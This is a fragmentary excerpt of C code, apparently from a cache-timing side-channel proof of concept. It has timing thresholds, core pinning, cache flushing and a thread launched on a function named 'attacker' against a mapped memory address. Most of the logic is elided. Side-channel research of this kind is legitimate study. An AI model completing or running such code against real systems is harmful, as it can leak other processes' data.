...
int tl_array[T_ARRAY_SIZE] = {156,93};
int th_array[T_ARRAY_SIZE] = {239,118};
...
void* cached_in_c1(void *addr){
    set_affinity(pthread_self(),sysconf(_SC_NPROCESSORS_CONF)/4>0?sysconf(_SC_NPROCESSORS_CONF)/4:1);
    for(int i=0;i<10;i++){
        flush(&i);
...
int main(int argc, char** argv)
{
    ...
    if (addr == (void *) -1)
        return 4;
    pthread_t threads[1];
    pthread_create(&threads[0], NULL, attacker, (void *)(addr + offset));
